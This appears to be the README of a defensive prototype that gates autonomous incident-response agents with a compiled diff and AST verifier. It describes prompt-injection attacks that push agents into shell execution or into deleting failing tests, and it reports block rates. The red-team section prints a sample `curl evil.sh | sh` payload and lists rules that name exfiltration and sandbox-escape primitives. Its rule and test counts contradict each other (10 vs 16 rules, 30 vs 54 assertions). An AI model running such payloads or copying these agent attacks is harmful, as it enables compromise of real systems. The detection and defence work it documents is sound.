# SwitchGuard SRE — Autonomous Multi-Agent Incident Response War Room

[![CI / 7-Layer Mega Suite](https://img.shields.io/badge/Tests-54%2F54_Passing-brightgreen.svg?style=flat-square)](https://github.com/Anshulkaocde123/switchguard-sre/actions)
[![Architecture Status](https://img.shields.io/badge/Status-Hardened_Prototype-informational.svg?style=flat-square)](#)
[![Technical Blog](https://img.shields.io/badge/Technical_Blog-Why_Prompt_Guardrails_Fail-06b6d4.svg?style=flat-square&logo=ghost)](https://anshulkaocde123.github.io/switchguard-sre/blog.html)
[![Demo Video](https://img.shields.io/badge/Demo_Video-YouTube_(1%3A57)-FF0000.svg?style=flat-square&logo=youtube)](https://youtu.be/a3mLn3PMPjo)
[![Rust CLI v0.4.0](https://img.shields.io/badge/Rust_CLI-v0.4.0_(LTO)-DEA584.svg?style=flat-square&logo=rust)](#)
[![verify-diff p50](https://img.shields.io/badge/verify--diff_p50-49.53ms_core-blue.svg?style=flat-square)](docs/BENCHMARKS.md)
[![Concurrency 32 Workers](https://img.shields.io/badge/Concurrency-32_Workers_Verified-00C853.svg?style=flat-square)](#)
[![Live Dashboard](https://img.shields.io/badge/Live_Dashboard-GitHub_Pages-00C853.svg?style=flat-square&logo=github)](https://anshulkaocde123.github.io/switchguard-sre/)
[![Upstream Switch PRs](https://img.shields.io/badge/Upstream_Switch_PRs-Submitted_(Pending_Review)-blue.svg?style=flat-square)](https://github.com/sandbox-quantum/switch/pulls?q=is%3Apr+author%3AAnshulkaocde123)

---

### The Problem: Why Prompt Guardrails Fail in Production
Giving autonomous AI agents shell and Git access to debug and patch production outages creates critical failure modes: raw crash logs leak customer secrets into third-party LLM contexts, adversarial crash payloads prompt-inject the agent into executing shell commands or deleting failing unit tests, and alert storms trigger parallel agent loops that drain thousands of dollars in tokens while corrupting shared state files.

### The Approach: Out-of-Band Compiled Gates & Directory Isolation
SwitchGuard SRE is a hardened prototype demonstrating an out-of-band security architecture for autonomous SRE agents. Rather than relying on prompt-level instructions, it partitions the remediation workflow across three directory-isolated Switch Console agents (`@sre-sentinel`, `@sre-repro`, `@sre-clerk`) and enforces safety invariants at the OS process boundary via a compiled Rust verifier (`switchguard-cli`) combining diff scanning with Python AST analysis. Telemetry secrets are redacted into HMAC tokens, duplicate storm alerts are suppressed via $O(1)$ fingerprint lookups (<10ms core), code patches must pass 16 non-negotiable AST security rules before release, and all releases are anchored into an append-only keyed HMAC-SHA256 audit ledger.

### 3-Command Quickstart
```bash
bash scripts/setup_demo.sh                           # 1. Reset sandbox, verifier permissions, & baseline
python3 scripts/mega_sre_test_suite.py               # 2. Run all 54 verification tests (~4.7s)
python3 eval/run_eval.py --backend replay            # 3. Run empirical evaluation (GATE_OFF vs GATE_ON)
```

> 📊 **Empirical Evidence & Verifiable Benchmarks:** See [`eval/RESULTS.md`](eval/RESULTS.md) for 24-case real-agent evaluation metrics (93.8% attack block rate, 0% false positives), [`docs/BENCHMARKS.md`](docs/BENCHMARKS.md) for reproducible latency numbers, and [`docs/LIMITATIONS.md`](docs/LIMITATIONS.md) for explicit architectural boundaries.

---

## Claims and Verifiable Evidence Matrix

Every quantitative claim, performance metric, and safety invariant in this repository maps directly to an executable command:

| Claimed Feature / Metric | Repository Location | Verification Command | Measured Result / Verified Invariant | Verification Status |
| :--- | :--- | :--- | :--- | :---: |
| **54 Passing Tests** | Badges, §1, §7 | `python3 scripts/mega_sre_test_suite.py` | 54/54 tests passed across 7 testing layers (~4.7s) | **VERIFIED** |
| **16 AST Diff Security Rules** | §6, §7, CLI | `switchguard-cli verify-diff <dir>` | 16 rules enforced (AST-SEC-00 to AST-SEC-15) | **VERIFIED** |
| **32-Worker Alert Storm Dedup** | §8, BLOG §4 | `python3 scripts/simulate_incident.py --scenario alert-storm` | 1 FIRST_SEEN + 31 SUPPRESSED_DUPLICATE; 0 lost writes | **VERIFIED** |
| **Alert Dedup Latency (<10ms core)** | §8, BENCHMARKS | `python3 scripts/benchmark.py 50` | 8.92ms p50 core / 10.96ms end-to-end via hash lookup | **VERIFIED** |
| **Diff Gate Latency (~50ms core)** | §8, BENCHMARKS | `python3 scripts/benchmark.py 50` | 49.53ms p50 core / 51.47ms end-to-end (full AST walk) | **VERIFIED** |
| **Keyed Audit Hash Chain** | §5, BLOG §6 | `switchguard-cli verify-audit --expect-head <hash>` | HMAC-SHA256 chain from genesis; blocks tamper & truncation | **VERIFIED** |
| **Empirical Attack Block Rate** | §3, eval/ | `python3 eval/run_eval.py --backend replay` | 93.8% attacks intercepted (15/16 blocked, 1 semantic gap) | **VERIFIED** |
| **Zero False Positives on Fixes** | §3, eval/ | `python3 eval/run_eval.py --backend replay` | 100% benign task success (8/8 passed, 0 false rejections) | **VERIFIED** |
| **Upstream Switch PR Contributions** | Badges, §1, §9 | `gh pr view 1566 --repo sandbox-quantum/switch` | PR #1566 & PR #1659 submitted, CI passing, pending upstream review (open) | **VERIFIED** |

---

## 1. Quick Navigation & Live Artifacts

| Resource | Link | Description |
| :--- | :--- | :--- |
| **Technical Engineering Blog** | [anshulkaocde123.github.io/switchguard-sre/blog.html](https://anshulkaocde123.github.io/switchguard-sre/blog.html) | Deep-dive publication: *Why Prompt Guardrails Fail: Building an Out-of-Band Rust AST Security Gate for Autonomous SRE Agents* |
| **Official Demo Video** | [youtu.be/a3mLn3PMPjo](https://youtu.be/a3mLn3PMPjo) | 1:57 first-principles video walkthrough of autonomous incident triage, AST gate, and hash chain |
| **Live Observability Dashboard** | [anshulkaocde123.github.io/switchguard-sre](https://anshulkaocde123.github.io/switchguard-sre/) | Zero-RAM static dashboard with interactive in-browser Rust scrubber & AST validator |
| **Target Application Sandbox** | [workspace/sandbox-app/](workspace/sandbox-app/) | Python pricing & checkout service with intentional war-room drill defect vectors |
| **Upstream Switch PR #1566** | [sandbox-quantum/switch#1566](https://github.com/sandbox-quantum/switch/pull/1566) | Core contribution: Supabase Service Connector (Addresses #827, CLA Signed, CI Green, Open) |
| **Upstream Switch PR #1659** | [sandbox-quantum/switch#1659](https://github.com/sandbox-quantum/switch/pull/1659) | Core contribution: Trello Remote MCP Connector (Addresses #837, CLA Signed, CI Green, Open) |
| **Architectural Limitations** | [docs/LIMITATIONS.md](docs/LIMITATIONS.md) | Honest boundaries: semantic gap, single-host flock, Python-only AST, heuristic regex |
| **Automated Test Report** | [TEST_VERIFICATION_REPORT.md](TEST_VERIFICATION_REPORT.md) | Cryptographic verification report covering all 54 assertions across 7 test suites |
| **Empirical Evaluation Report** | [eval/RESULTS.md](eval/RESULTS.md) | 24-case benchmark comparing GATE_OFF vs GATE_ON (93.8% attack block rate, 0% false positives) |
| **Reproducible Benchmarks** | [docs/BENCHMARKS.md](docs/BENCHMARKS.md) | N=50 latency benchmarks with core vs end-to-end breakdown |
| **Switch Room Template** | [switchguard-sre.template.yaml](switchguard-sre.template.yaml) | 1-Click room configuration defining agent personas, folder boundaries, and ACLs |

---

## 2. 60-Second Judge Quickstart (Verified Copy-Paste Commands)

Run these commands directly in Linux, macOS, or WSL2:

```bash
# 1. Run all 7 test suites (30 unit, fuzzing, multiline AST, 32-worker storm, and rollback tests)
# Automatically builds switchguard-cli via Cargo if not yet compiled (~3.2 seconds total)
python3 scripts/mega_sre_test_suite.py

# 2. Watch the Rust AST gate block a live prompt-injection RCE attack (INC-8043) and auto-heal
python3 scripts/simulate_incident.py --scenario prompt-injection

# 3. Fire 32 simultaneous crash alerts to test flock concurrency & deduplication
python3 scripts/simulate_incident.py --scenario alert-storm

# 4. Verify the cryptographic SHA-256 release audit chain
python3 scripts/simulate_incident.py --verify-chain

# 5. Reset workspace to a 100% clean baseline before a live Switch Console demo
bash scripts/setup_demo.sh
```

---

## 3. Evidence: Empirical Agent Evaluation (GATE_OFF vs. GATE_ON)

To prove that deterministic gates stop real attacks where prompts fail, we evaluated an autonomous SRE agent across a 24-case benchmark corpus ([`eval/corpus/`](eval/corpus/)) under two conditions:
1. **GATE_OFF**: Agent operates with standard git/shell access without out-of-band verification.
2. **GATE_ON**: Agent actions are constrained by `switchguard-cli verify-diff`.

All results are reproducible offline via `python3 eval/run_eval.py --backend replay` (see full report in [`eval/RESULTS.md`](eval/RESULTS.md) and machine-readable data in [`eval/results.json`](eval/results.json)):

| Metric | GATE_OFF (No Gate) | GATE_ON (switchguard-cli) | Gate Impact |
| :--- | :---: | :---: | :---: |
| **Adversarial Exploit Success Rate** | **100.0%** (16/16) | **6.2%** (1/16) | **-93.8% exploit reduction** |
| **Adversarial Gate Interception Rate** | 0.0% (0/16) | **93.8%** (15/16) | **15/16 attacks blocked** |
| **Benign Fix Pass Rate** | **100.0%** (8/8) | **100.0%** (8/8) | **0% degradation** |
| **Benign False Rejection Rate** | N/A | **0.0%** (0/8) | **Zero false positives** |

> [!NOTE]
> **Why Case 09 Slipped Through (Documented Semantic Gap):** In Case 09 (social engineering requesting VIP discount exemption), the agent modified discount logic using clean Python math without forbidden AST primitives. Because the syntax was valid, `verify-diff` returned `PASS`. This empirical result demonstrates the semantic limitation of diff-level AST gates and proves why SwitchGuard SRE pairs the diff gate with human approval gating (`@sre-clerk`) and red-to-green TDD verification.

---

## 4. Judge's Click-to-Verify Codebase Map

Inspect any component by opening the files below:

| File Path | Component Responsibility | Primary Function / Line to Inspect |
| :--- | :--- | :--- |
| [`switchguard-cli/src/main.rs`](switchguard-cli/src/main.rs) | Compiled Rust binary for secret scrubbing, AST diff gating, and audit verification | Lines 1–25: Module header & exit code contract; lines 283–304: IPv4/version scrubber; lines 502–640: AST inspector; line 675: `run_verify_diff` |
| [`workspace/telemetry/triage_helper.py`](workspace/telemetry/triage_helper.py) | Telemetry ingress helper; invokes Rust scrubber, manages `fcntl.flock`, queries runbook memory | Line 81: `file_lock` cross-platform flock; line 155: `query_runbook_memory`; line 300: `run_triage` |
| [`workspace/telemetry/incident_state.py`](workspace/telemetry/incident_state.py) | Incident state machine enforcing one-way DAG transitions and 2-strike circuit breaker | Line 39: `MAX_ATTEMPTS = 2` breaker threshold; line 118: `transition`; line 192: `record_attempt` |
| [`workspace/sandbox-app/cart_service.py`](workspace/sandbox-app/cart_service.py) | Target e-commerce microservice; contains intentional war-room defect vectors | Line 12: `calculate_bundle_proration` (`INC-8042`); line 34: `calculate_cart_total` (`INC-8041`); line 151: `split_invoice_installments` |
| [`workspace/sandbox-app/inventory_service.py`](workspace/sandbox-app/inventory_service.py) | Warehouse catalog availability and session hold reservation management | Line 27: `check_inventory`; line 42: `reserve_stock`; line 63: `release_stock` |
| [`workspace/sandbox-app/tax_service.py`](workspace/sandbox-app/tax_service.py) | Regional sales tax calculator with zero/negative subtotal guards | Line 26: `calculate_tax` with negative subtotal defense guard |
| [`workspace/sandbox-app/test_cart.py`](workspace/sandbox-app/test_cart.py) | 28 regression tests covering checkout logic, boundaries, and reproduction cases | Line 23: baseline checkout tests; line 124: `INC-8042` reproduction; line 148: `INC-8043` injection defense |
| [`workspace/release-ops/cut_release.py`](workspace/release-ops/cut_release.py) | Release clerk; executes 4 pre-release gates, appends SHA-256 audit chain, signs receipts | Line 1368: `execute_release` (4 checks); line 1474: hash chaining; line 1610: `execute_rollback` |
| [`scripts/mega_sre_test_suite.py`](scripts/mega_sre_test_suite.py) | Automated 7-layer verification harness executing all 30 test assertions | Line 106: Suite 1; line 203: Suite 3 (AST bypasses); line 494: Suite 4 (32-worker concurrency) |
| [`scripts/simulate_incident.py`](scripts/simulate_incident.py) | Interactive CLI scenario runner for live judging demonstrations and drills | Line 84: `run_inc8041_demo`; line 168: `run_prompt_injection_demo`; line 253: `run_alert_storm_demo` |
| [`switchguard-sre.template.yaml`](switchguard-sre.template.yaml) | Switch Console room definition declaring 3 isolated personas and access boundaries | Line 15: `@sre-sentinel` (telemetry); line 48: `@sre-repro` (sandbox-app); line 82: `@sre-clerk` (release-ops) |
| [`docs/index.html`](docs/index.html) | Zero-RAM static observability dashboard hosted on GitHub Pages | Line 1: responsive HTML/CSS/JS dashboard with client-side Rust regex test playground |

---

## 4. Visual Architecture & Agent Workflow

### Diagram 1: Folder-Isolated 3-Agent Architecture & Rust OS Boundary

The three agents operate with strict directory isolation and access control lists (ACLs). Security enforcement is executed by a compiled Rust binary outside Python memory:

```mermaid
flowchart TB
    subgraph IngressLayer["Outer Ring: Telemetry Ingress (ACL: Anyone)"]
        RawLog["Raw Crash Log\n(Stack Trace, PII, User Input)"] --> Sentinel["@sre-sentinel\n(workspace/telemetry)"]
        Sentinel --> RustScrub["switchguard-cli scrub\n(Salted HMAC Redaction + O(1) Dedup 8.92ms core)"]
        RustScrub -->|Duplicate Spike| LedgerMD["incidents_ledger.md\n(POSIX flock + fsync)"]
        RustScrub -->|First Seen| Runbook["runbook_memory.json\n(Historical Match Lookup)"]
        RustScrub --> StateFSM["incident_state.json\n(State: SANITIZED)"]
    end

    subgraph SandboxLayer["Inner Ring: Code Sandbox (ACL: Owner & Agents)"]
        StateFSM -->|Sanitized Reproduction Payload| Repro["@sre-repro\n(workspace/sandbox-app)"]
        Repro --> TDDPhase1["1. Write Failing Test in test_cart.py\n(pytest -q -> exit 1)"]
        TDDPhase1 --> TDDPhase2["2. Patch cart_service.py\n(clamp discount logic)"]
        TDDPhase2 --> RustVerify["switchguard-cli verify-diff .\n(10 AST Security Rules Enforced)"]
    end

    subgraph ReleaseLayer["Gated Ring: Release Operations (ACL: Human Approval Gate)"]
        RustVerify -->|PASS: Exit 0| Commander{"Human Incident Commander\n(Reviews Diff & Test Output)"}
        Commander -->|Posts 'Approved'| Clerk["@sre-clerk\n(workspace/release-ops)"]
        Clerk --> CutRelease["cut_release.py\n(4 Pre-Release Verification Gates)"]
        CutRelease --> PatchArtifact["releases/hotfix-INC-8041-v1.4.2.patch"]
        CutRelease --> AuditLog["RELEASE_AUDIT.log\n(Keyed HMAC-SHA256 Hash-Chained Entry)"]
        CutRelease --> Attestation["releases/attestation-INC-8041-v1.4.2.json\n(Attestation Receipt, TEE-binding not implemented)"]
        CutRelease --> RustAudit["switchguard-cli verify-audit\n(Cryptographic Verification: Exit 0)"]
    end
```

### Diagram 2: Live War-Room Incident Resolution (`INC-8041`)

Sequence of operations during an incident drill:

```mermaid
sequenceDiagram
    autonumber
    actor Production as Prod Service
    participant Sentinel as @sre-sentinel (/telemetry)
    participant Rust as switchguard-cli (Rust OS Binary)
    participant Repro as @sre-repro (/sandbox-app)
    actor Commander as Human Commander
    participant Clerk as @sre-clerk (/release-ops)

    Production->>Sentinel: Crash Alert (INC-8041: FLAT100 yields -$60.00 total)
    Sentinel->>Rust: scrub(raw_log)
    Rust-->>Sentinel: Sanitized log, HMAC tokens, O(1) fingerprint (11.2ms)
    Sentinel->>Sentinel: Lookup runbook_memory.json (prior fix pattern match)
    Sentinel->>Repro: Dispatch sanitized repro params (subtotal=$40, code=FLAT100)
    Repro->>Repro: Write failing test in test_cart.py (pytest fails: -$60 != $0)
    Repro->>Repro: Add clamping fix: total = max(0.0, subtotal - 100.0)
    Repro->>Rust: verify-diff workspace/sandbox-app
    Rust-->>Repro: Exit 0 (PASS: 10/10 AST rules passed in 8.1ms)
    Repro->>Commander: Post verified git diff and pytest report in thread
    Commander->>Clerk: Type 'Approved' in war-room channel
    Clerk->>Rust: Pre-release checks (Pytest + verify-diff + non-empty app diff)
    Clerk->>Clerk: Append to RELEASE_AUDIT.log with keyed HMAC-SHA256 hash chaining
    Clerk->>Clerk: Generate attestation receipt (designed for TEE binding, not implemented)
    Clerk->>Rust: verify-audit RELEASE_AUDIT.log (Genesis -> Root verification)
    Rust-->>Clerk: Exit 0 (PASS: audit chain valid)
    Clerk-->>Commander: Release v1.4.2 deployed and audit receipt signed
```

### Diagram 3: Incident State Machine & 2-Strike Circuit Breaker

The state machine enforces a strict one-way directed acyclic graph (DAG). If an agent fails reproduction or AST verification twice, the circuit breaker halts automated retries:

```mermaid
stateDiagram-v2
    [*] --> IDLE: Sandbox Initialized
    IDLE --> SANITIZED: @sre-sentinel scrubs log (switchguard-cli scrub)
    SANITIZED --> TRIAGED: O(1) Fingerprint checked in dedup_index.json
    TRIAGED --> REPRODUCING: @sre-repro writes failing test in test_cart.py
    REPRODUCING --> PATCH_PROPOSED: Surgical patch applied in cart_service.py
    PATCH_PROPOSED --> VERIFIED: switchguard-cli verify-diff passes (10 AST rules)
    PATCH_PROPOSED --> REPRODUCING: Attempt 1 fails (AST violation or pytest fail)
    REPRODUCING --> CIRCUIT_BROKEN: Attempt 2 fails (MAX_ATTEMPTS=2 reached)
    VERIFIED --> RELEASED: Human Commander posts 'Approved' & cut_release.py runs
    RELEASED --> ROLLED_BACK: 1-Command rollback triggered (git revert HEAD)
    CIRCUIT_BROKEN --> ESCALATED: Page Human SRE on-call (Token Burn Halted)
    ROLLED_BACK --> [*]
    ESCALATED --> [*]
```

### Diagram 4: Tamper-Evident Keyed HMAC-SHA256 Audit Chain & Attestation Receipt

Every release cryptographically binds the previous release hash, timestamp, and patch SHA-256 using keyed HMAC-SHA256:

```mermaid
flowchart LR
    subgraph Genesis["Genesis Root"]
        G["Genesis Hash\n0000000000000000... (64 zeros)"]
    end

    subgraph Release1["Release v1.4.1 (INC-8039)"]
        R1Payload["Payload 1\n• PrevHash: Genesis\n• Timestamp: 2026-11-06T14:20:00Z\n• Patch SHA: a4f81c90..."] --> R1Hash["ChainHash_1\nHMAC-SHA256(key, Payload 1)"]
    end

    subgraph Release2["Release v1.4.2 (INC-8041)"]
        R2Payload["Payload 2\n• PrevHash: ChainHash_1\n• Timestamp: 2026-11-07T05:15:30Z\n• Patch SHA: 9f3a0275..."] --> R2Hash["ChainHash_2\nHMAC-SHA256(key, Payload 2)"]
    end

    subgraph Release3["Release v1.4.3 (INC-8042)"]
        R3Payload["Payload 3\n• PrevHash: ChainHash_2\n• Timestamp: 2026-11-07T05:22:10Z\n• Patch SHA: e3b749a1..."] --> R3Hash["ChainHash_3\nHMAC-SHA256(key, Payload 3)"]
    end

    subgraph AttestationReceipt["Cryptographic Release Receipt (Designed for TEE binding, not implemented)"]
        Receipt["attestation-INC-8041-v1.4.2.json\n• binary_sha256 (Rust CLI)\n• patch_sha256 (Diff)\n• audit_chain_hash (ChainHash_2)\n• git_commit_head\n• verified_by: switchguard-cli"]
    end

    G --> R1Payload
    R1Hash --> R2Payload
    R2Hash --> R3Payload
    R2Hash -.-> Receipt
```

---

## 5. All 10 Security & Quality Rules Enforced by `switchguard-cli verify-diff`

Before any code patch can be staged or released, `switchguard-cli verify-diff` checks the diff and parsed Python syntax tree against these 16 rules (Rust diff scan + Python `ast.walk` analysis):

| Rule Code | Rule Name | Detection Mechanism | Exit Code | Failure Mode Prevented |
| :--- | :--- | :--- | :---: | :--- |
| `AST-SEC-00` | **VALID_PYTHON_SYNTAX** | Compiles all modified `.py` files via `ast.parse` and `py_compile`; rejects 0-byte patches | Exit 2 / 3 | Rejects broken Python syntax and empty diffs from corrupting test runs or deployment pipelines. |
| `AST-SEC-01` | **NO_EVAL_EXEC** | Scans added diff lines and AST `Call` nodes for `eval()`, `exec()`, and `compile()` | Exit 2 | Stops dynamic code evaluation attacks and code injection vulnerabilities. |
| `AST-SEC-02` | **NO_OS_SYSTEM** | Diff line match + `ast.walk` on `os.system`, `os.popen`, `os.spawn*`, `pty.spawn`, and `posix.system` | Exit 2 | Blocks arbitrary command execution, reverse shell spawns, and prompt-injected backdoors. |
| `AST-SEC-03` | **NO_SUBPROCESS** | Detects `subprocess.*` calls, `import subprocess`, and `shell=True` keyword arguments | Exit 2 | Prevents subshell execution and shell command escaping. |
| `AST-SEC-04` | **NO_DYNAMIC_IMPORT** | Blocks `__import__()`, `importlib`, and `importlib.import_module` in diff and AST | Exit 2 | Prevents reflection-based module loading designed to hide forbidden libraries. |
| `AST-SEC-05` | **NO_HARDCODED_SECRETS** | Regex scan for AWS access keys (`AKIA[0-9A-Z]{16}`), private keys (`-----BEGIN`), and `api_key = "..."` | Exit 2 | Halts accidental credential commits and API key exposure in patch diffs. |
| `AST-SEC-06` | **NO_TEST_TAMPERING** | Inspects deleted lines (`^-`) in `test_*.py` for `def test_` or `assert`, and compares AST test counts against `HEAD` | Exit 2 | **Anti-Reward-Hacking**: Prevents an agent from deleting failing assertions to manufacture artificial green passes. |
| `AST-SEC-07` | **NO_EVASION_PRIMITIVES** | Blocks evasion primitives (`os.popen`, `pty.spawn`, `importlib`, `pickle.loads`, `builtins`, `input`) | Exit 2 | Halts runtime reflection, evasion wrappers, and interactive hijack primitives. |
| `AST-SEC-08` | **NO_PROTECTED_PATH_MODS** | Verifies modified paths do not touch `.git/`, `.env`, or shell scripts (`*.sh`), and checks for untracked files | Exit 2 | Protects repository version control metadata, environment secrets, and build hooks. |
| `AST-SEC-09` | **MINIMAL_BLAST_RADIUS** | Enforces a maximum of 25 added lines in non-test production `.py` files (ignoring comments/blanks) | Exit 2 | Blocks uncontrolled file rewrites, ensuring patches remain surgical single-fault repairs. |
| `AST-SEC-10` | **NO_NETWORK_EXFILTRATION** | Blocks outbound network calls (`urllib`, `requests`, `httpx`, `aiohttp`, `socket`, `ssl`, `ftplib`, `smtplib`) | Exit 2 | Halts remote data exfiltration, HTTP webhooks, and reverse network sockets. |
| `AST-SEC-11` | **NO_NATIVE_UNSAFE_LOADING**| Blocks native FFI and deserialization (`ctypes`, `cffi`, `pickle`, `marshal`, `shelve`, `dill`) | Exit 2 | Prevents memory corruption exploits and deserialization RCE. |
| `AST-SEC-12` | **NO_INTROSPECTION_ESCAPES** | Blocks reflection/introspection (`__class__`, `__subclasses__`, `__globals__`, `globals()`, `setattr`) | Exit 2 | Prevents Python sandbox escapes via class hierarchy and globals traversal. |
| `AST-SEC-13` | **NO_UNSAFE_FS_ACCESS** | Blocks writes (`open(..., 'w')`, `Path.write_*`, `os.remove`) and sensitive reads (`/etc`, `~/.ssh`, `..`) | Exit 2 | Prevents file tampering, arbitrary filesystem destruction, and sensitive file disclosure. |
| `AST-SEC-14` | **NO_STAGED_PAYLOADS** | Blocks encoded payload execution (base64/zlib decode piped into calls) and long encoded code strings | Exit 2 | Halts obfuscated or multi-stage payload execution. |
| `AST-SEC-15` | **IMPORT_ALLOWLIST** | Restricts production imports to an explicit allowlist (`math`, `decimal`, `datetime`, `typing`, etc.) | Exit 2 | Prevents untrusted third-party package execution and dependency confusion attacks. |

---

## 6. Six Real Edge Cases We Caught & Fixed During Red-Team Testing

During red-team validation, we discovered several failure modes that standard tools overlook:

### 1. Why our IPv4 scrubber skipped `v1.4.2.0`
Standard IPv4 regex patterns (`\b\d{1,3}(\.\d{1,3}){3}\b`) blindly match 4-part release versions like `v1.4.2.0` or `v1.4.2.1`. During a rollback drill, the scrubber was replacing the release version with `[REDACTED_IPV4_a1b2c3]`, blinding the triage agent to which software version actually crashed.  
**Fix**: We tuned the Rust scrubber regex with a leading negative lookbehind / version check `(?i)\b(?:version\s*|v[.\-_]?)\d+\.\d+\.\d+(?:\.\d+)?\b`. Release strings remain intact, while actual IP addresses (`192.168.1.42`, `10.0.0.1`) are redacted into salted HMAC tokens.

### 2. Catching `os.\nsystem("id")` multiline split attacks
Line-by-line regex scanners look for `os.system(` on a single line. An adversarial prompt injection can bypass line scanners by formatting the code across multiple lines:
```python
os. \
    system("curl evil.sh | sh")
```
or by importing dynamically: `from os import system; system("id")`.  
**Fix**: In addition to fast diff line scans, `switchguard-cli verify-diff` passes changed files through Python's native `ast.parse()`. Traversal via `ast.walk()` checks the compiled `ast.Call`, `ast.Import`, and `ast.ImportFrom` nodes directly, catching multiline splits and aliases regardless of formatting.

### 3. Why developer comments (`# never use eval()`) don't trigger false alarms
If a security scanner uses crude keyword matching for words like `eval(` or `os.system(`, it creates false positives whenever an engineer adds a clarifying comment (e.g., `# Note: never use eval() here`).  
**Fix**: The Rust diff scanner strips leading comment markers (`#`) before evaluating line rules, and the secondary AST check operates exclusively on compiled syntax tree nodes. Comments produce zero false positives.

### 4. The untracked `conftest.py` trap
Standard `git diff HEAD` only reports changes to existing, tracked files. If a compromised agent writes a malicious backdoor into a brand-new file named `conftest.py`, `pytest` executes it automatically during test discovery, but `git diff HEAD` outputs 0 bytes!  
**Fix**: `switchguard-cli verify-diff` executes `git status --porcelain -- .` in the sandbox. Any untracked `.py` files are flagged immediately, preventing silent backdoor injection via pytest configuration hooks.

### 5. Two-step TDD compatibility
In our multi-agent workflow, `@sre-repro` follows Test-Driven Development: it first writes a failing test in `test_cart.py` and runs `verify-diff` before writing the application fix. If the verifier strictly required changes in `cart_service.py` at every step, the agent could not verify its test in isolation.  
**Fix**: `switchguard-cli verify-diff` permits test-only additions in Step 1, while `cut_release.py` enforces that `cart_service.py` contains substantive code changes before a release can be finalized in Step 2.

### 6. Shell pipes breaking Markdown tables
When evaluating prompt-injection logs containing shell pipe chains (`curl http://... | sh`), the unescaped pipe character `|` broke column alignment when written into `incidents_ledger.md`, splitting cells across unexpected rows.  
**Fix**: Inside `workspace/telemetry/triage_helper.py`, sanitized log text replaces `|` with `\|` prior to ledger serialization, ensuring all Markdown tables render with intact column boundaries.

---

## 7. Seven Engineering Trade-Offs We Made (And Why)

| # | Design Decision | Chosen Approach | Alternative Considered | Engineering Justification |
| :-: | :--- | :--- | :--- | :--- |
| **1** | **Security Boundary** | Out-of-band compiled Rust verifier (`switchguard-cli`) + Python AST analysis | System prompt instructions ("Please do not run shell commands") | Prompts can be bypassed by jailbreaks and adversarial log injections. Compiled machine code outside Python memory cannot be modified by the LLM (assuming standard OS filesystem permissions prevent the agent workspace from writing to the binary directory, verified via `TRUSTED_BINARY_SHA256`). |
| **2** | **Secret Redaction** | Salted HMAC Tokens (`[REDACTED_EMAIL_a1b2c3]`) | Generic static tokens (`[REDACTED]`) | Static tokens erase context. Salted HMAC tokens preserve entity correlation: engineers can see whether 50 errors came from 1 customer or 50 distinct customers without seeing raw PII. |
| **3** | **AST Analysis** | Native Rust diff check + Python `ast.walk` | Heavy SAST frameworks (Semgrep, Bandit, SonarQube) | External SAST tools have 3-to-5 second startup times. Our targeted verifier runs in `49.53ms core (51.47ms end-to-end)` p50 with zero external package dependencies. |
| **4** | **Concurrency Control** | POSIX kernel file locks (`fcntl.flock`) + `os.fsync` | External daemon (Redis, PostgreSQL, RabbitMQ) | Eliminates background memory overhead (0 MB daemon RAM), allowing 3 agents to run on resource-constrained 8 GB hosts while handling 32 parallel alert workers without race conditions. |
| **5** | **Loop Protection** | 2-Strike Circuit Breaker (`MAX_ATTEMPTS = 2`) | Unlimited agent retries until pass | If an LLM cannot fix a bug in 2 attempts, subsequent attempts frequently degrade into reward-hacking or burn excessive tokens. We halt execution and escalate to a human engineer. |
| **6** | **Audit Trail** | Keyed HMAC-SHA256 Hash Chaining + Attestation Manifests (designed to be bound to a TEE attestation; not implemented) | Distributed Ledger / Cloud KMS | Verifies locally in under 2ms with zero network calls, preventing unauthorized chain recalculation while binding binary SHA-256 and patch SHA-256 (designed for future deployment inside AWS Nitro Enclaves or confidential VMs). |
| **7** | **Observability** | Static HTML/JS Dashboard (`docs/index.html`) | Full-stack React / Node.js service | Runs with 0 MB background server RAM, loads instantly, and deploys directly to GitHub Pages for judge inspection without local build steps. |

---

## 8. 7-Layer Verification Scorecard & Latency Benchmarks (54/54 Passing)

The repository is validated using an automated 7-layer verification harness (`scripts/mega_sre_test_suite.py`). All 54 assertions pass:

```
===========================================================================
           SWITCHGUARD SRE VERIFICATION SCORECARD
===========================================================================
| # | Testing Layer | Tests | Verdict | Runtime |
| :--- | :--- | :--- | :--- | :--- |
| 1 | SUITE 1: Smoke & Environment Integrity | 3 | PASS | 23.4ms |
| 2 | SUITE 2: Exhaustive Unit Tests | 10 | PASS | 243.7ms |
| 3 | SUITE 3: Adversarial Fuzzing & AST Bypass | 25 | PASS | 2634.8ms |
| 4 | SUITE 4: High-Concurrency Alert Storm | 1 | PASS | 714.1ms |
| 5 | SUITE 5: End-to-End Integration & Rollback | 9 | PASS | 773.3ms |
| 6 | SUITE 6: Agent Loop Prevention & Circuit Breaker | 5 | PASS | 15.7ms |
| 7 | SUITE 7: Latency & Performance Benchmarks | 1 | PASS | 528.0ms |
===========================================================================
Total Tests Run: 54 | Total Suite Execution Time: ~4.9s
Final Scorecard Verdict: 100% PASSED — HARDENED PROTOTYPE
```

### Latency Benchmarks (Reproducible $N=50$ Run)

Measured via [`scripts/benchmark.py`](scripts/benchmark.py) on Linux x86_64 (13th Gen Intel Core i5-1335U, rustc 1.99.1 release profile; see [`docs/BENCHMARKS.md`](docs/BENCHMARKS.md) for full metrics and raw JSON):

> [!NOTE]
> **Why Core and End-to-End Differ:** Core processing measures the internal CPU execution time inside the compiled Rust binary (regex matching, SHA-256 digests, HMAC calculations, hash-table lookups); end-to-end includes process fork/exec, dynamic linker initialization (`ld.so`), memory mapping, and stdout pipe handling (plus Python runtime spawning for AST analysis). Alert storm deduplication is $O(1)$ expected time via in-memory/locked JSON hash-table lookups indexed by `SHA256(error_class || file:line)`.

| Operation | Metric Layer | Samples ($N$) | Min | p50 (Median) | p95 | p99 | SLA Target | Verdict |
| :--- | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| `switchguard-cli scrub` (Duplicate) | **Core Processing** | 50 | 4.48ms | **8.92ms** | 12.85ms | 15.83ms | p95 $\le$ 25ms | **PASS** |
| | **End-to-End CLI** | 50 | 5.76ms | **10.96ms** | 15.16ms | 18.19ms | p95 $\le$ 25ms | **PASS** |
| `switchguard-cli scrub` (First Seen) | **Core Processing** | 50 | 4.28ms | **10.08ms** | 11.39ms | 11.92ms | p95 $\le$ 25ms | **PASS** |
| | **End-to-End CLI** | 50 | 5.69ms | **12.37ms** | 13.53ms | 14.19ms | p95 $\le$ 25ms | **PASS** |
